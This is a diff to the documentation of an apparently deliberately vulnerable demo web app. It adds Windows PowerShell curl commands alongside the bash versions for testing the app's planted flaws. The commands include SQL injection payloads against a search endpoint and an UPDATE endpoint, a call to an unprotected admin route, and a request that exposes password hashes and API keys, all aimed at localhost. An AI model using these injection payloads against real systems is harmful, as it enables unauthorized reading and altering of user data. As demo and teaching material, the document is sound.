@@ -36,18 +36,30 @@ npm run dev          # Development mode with nodemon
 ```
 
 ### Testing Vulnerabilities (Essential for Demos)
-```bash
-# SQL Injection - Returns all users
-curl "http://localhost:3000/api/users/search?username=' OR '1'='1"
+```powershell
+# Windows PowerShell - use curl.exe with URL-encoded parameters
+# SQL Injection - Returns all users (single quotes encoded as %27)
+curl.exe "http://localhost:3000/api/users/search?username=%27%20OR%20%271%27=%271"
 
 # Missing Auth - Admin endpoint accessible to anyone
-curl "http://localhost:3000/api/users/admin/getAllUsers"
+curl.exe "http://localhost:3000/api/users/admin/getAllUsers"
 
 # Data Exposure - Shows password_hash and api_key fields
-curl "http://localhost:3000/api/users/list"
+curl.exe "http://localhost:3000/api/users/list"
 
 # SQL Injection in UPDATE
-curl -X POST http://localhost:3000/api/users/update \
+$body = '{"userId": "1 OR 1=1", "email": "evil@hack.com"}'
+curl.exe -X POST "http://localhost:3000/api/users/update" `
+  -H "Content-Type: application/json" `
+  -d $body
+```
+
+```bash
+# Linux/Mac bash - standard curl syntax
+curl "http://localhost:3000/api/users/search?username=' OR '1'='1"
+curl "http://localhost:3000/api/users/admin/getAllUsers"
+curl "http://localhost:3000/api/users/list"
+curl -X POST "http://localhost:3000/api/users/update" \
   -H "Content-Type: application/json" \
   -d '{"userId": "1 OR 1=1", "email": "evil@hack.com"}'
 ```
